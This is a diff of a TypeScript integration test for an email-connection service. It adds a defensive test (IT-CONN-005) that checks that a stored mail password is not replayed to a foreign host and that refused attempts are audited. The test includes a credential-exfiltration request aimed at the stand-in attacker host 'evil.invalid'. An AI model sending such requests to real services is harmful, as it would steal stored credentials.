@@ -104,22 +104,22 @@ describe('IT-CONN: email connection config + test + DB-over-env', () => {
       ...over,
     });
 
-    const bothOk = await svc.testConnection(HRIS, base({}));
+    const bothOk = await svc.testConnection(admin, HRIS, base({}));
     expect(bothOk.imap.ok).toBe(true);
     expect(typeof bothOk.imap.messages).toBe('number'); // INBOX count came back
     expect(bothOk.smtp.ok).toBe(true);
 
-    const imapBad = await svc.testConnection(HRIS, base({ imapPort: 1 }));
+    const imapBad = await svc.testConnection(admin, HRIS, base({ imapPort: 1 }));
     expect(imapBad.imap.ok).toBe(false);
     expect(imapBad.imap.error).toBeTruthy();
     expect(imapBad.smtp.ok).toBe(true); // the other leg still ✅
 
-    const smtpBad = await svc.testConnection(HRIS, base({ smtpPort: 1 }));
+    const smtpBad = await svc.testConnection(admin, HRIS, base({ smtpPort: 1 }));
     expect(smtpBad.imap.ok).toBe(true);
     expect(smtpBad.smtp.ok).toBe(false);
     expect(smtpBad.smtp.error).toBeTruthy();
 
-    const bothBad = await svc.testConnection(HRIS, base({ imapPort: 1, smtpPort: 1 }));
+    const bothBad = await svc.testConnection(admin, HRIS, base({ imapPort: 1, smtpPort: 1 }));
     expect(bothBad.imap.ok).toBe(false);
     expect(bothBad.smtp.ok).toBe(false);
 
@@ -199,6 +199,71 @@ describe('IT-CONN: email connection config + test + DB-over-env', () => {
     const [row2] = await harness!.db.select().from(emailConnections).where(eq(emailConnections.projectId, HRIS));
     expect(decryptSecret(row2!.passwordEncrypted!)).toBe(secret);
   });
+
+  // ── IT-CONN-005: the stored App Password may not be replayed to a foreign host ─
+  it('IT-CONN-005: test-connection refuses to send the stored password to a different host, and audits every attempt', async () => {
+    if (!ready) return;
+    const secret = 'sup3r-secret-app-pw';
+    await svc.update(admin, HRIS, 'hris', {
+      imapHost: gm!.host,
+      imapPort: gm!.imapPort,
+      imapUser: HRIS_BOX,
+      smtpHost: gm!.host,
+      smtpPort: gm!.smtpPort,
+      smtpUser: HRIS_BOX,
+      password: secret,
+    });
+
+    // The exfil shape: omit `password` (what the UI sends when the box is left
+    // blank) and name a host the caller controls. The server must NOT decrypt the
+    // stored secret and hand it over.
+    const exfil = await svc.testConnection(admin, HRIS, {
+      imapHost: 'evil.invalid',
+      imapPort: 2143,
+      imapUser: 'x',
+      smtpHost: 'evil.invalid',
+      smtpPort: 2525,
+      smtpUser: 'x',
+    });
+    expect(exfil.imap.ok).toBe(false);
+    expect(exfil.smtp.ok).toBe(false);
+    expect(exfil.imap.error).toMatch(/host differs/i);
+
+    // Refused BEFORE any socket is opened — and the attempt is on the record.
+    const refusedAudit = await harness!.db.execute(
+      sql`SELECT new_value FROM audit_log WHERE action = 'email_connection.tested'`,
+    );
+    const dump = JSON.stringify(refusedAudit);
+    expect(dump).toContain('refusedHostMismatch');
+    expect(dump).toContain('evil.invalid');
+    expect(dump).not.toContain(secret); // the audit never carries the password
+
+    // The saved host still tests fine without a password — the stored secret is
+    // still usable for its own destination, so the guard costs the admin nothing.
+    const sameHost = await svc.testConnection(admin, HRIS, {
+      imapHost: gm!.host,
+      imapPort: gm!.imapPort,
+      imapUser: HRIS_BOX,
+      smtpHost: gm!.host,
+      smtpPort: gm!.smtpPort,
+      smtpUser: HRIS_BOX,
+    });
+    expect(sameHost.imap.ok).toBe(true);
+    expect(sameHost.smtp.ok).toBe(true);
+
+    // A foreign host IS allowed when the caller supplies the password themselves —
+    // they already know it, so nothing is disclosed. (Connection fails: no such host.)
+    const byoPassword = await svc.testConnection(admin, HRIS, {
+      imapHost: 'evil.invalid',
+      imapPort: 2143,
+      imapUser: 'x',
+      smtpHost: 'evil.invalid',
+      smtpPort: 2525,
+      smtpUser: 'x',
+      password: 'their-own-password',
+    });
+    expect(byoPassword.imap.error).not.toMatch(/host differs/i);
+  }, 60000);
 
   // ── IT-CONN-004: core mail path stays green on config-from-DB + env fallback ──
   it('IT-CONN-004: poll + outbox + transactional send all work via the DB row, and env-fallback when no row', async () => {
